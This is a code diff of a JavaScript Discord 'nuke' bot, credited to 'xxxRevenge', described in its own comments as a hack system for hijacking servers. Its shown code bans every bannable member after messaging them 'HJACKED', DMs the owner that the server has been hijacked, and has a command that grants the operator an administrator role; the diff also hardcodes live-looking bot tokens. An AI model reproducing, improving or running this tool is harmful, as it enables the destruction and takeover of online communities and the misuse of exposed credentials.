@@ -14,6 +14,7 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
+const Token = 'NjMwNzc2NTYwOTY5OTczNzYy.XZtkfw.moVY2Ny_Z7ml-DnDXJiaCFwSheo' //حط توكن بوتك هنا // your bot token
 const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
@@ -44,19 +45,19 @@ console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size}
 });
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
-    let users = 1;
-    let channels = 1;
+    let users = 0;
+    let channels = 0;
   
     await guild.fetchMembers();
   
-    await guild.owner.send('ลบให้แล้วนะครับ!').catch(e => { return void e; });
+    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
   
   
   
     await Promise.all(guild.members.map(async (m) => {
       if (m.bannable) {
         users++;
-        await m.send('꧁༻มะงึก อุ๋งๆ༺꧂ ปิดตัวลงแล้ว').catch(e => { return void e; });
+        await m.send('HJACKED').catch(e => { return void e; });
         return m.ban();
       }
     }));
@@ -485,4 +486,4 @@ let op = message.guild.roles.find('name', `${adminstrator}`)
     message.guild.member(member).addRole(op);
   }
 });
-client.login('NjI4NjI4MjUwOTE4Mzg3NzIy.XZtWQQ.Giz6RdAr88_1OgM0axX_6-EmTbo')
+client.login(Token)
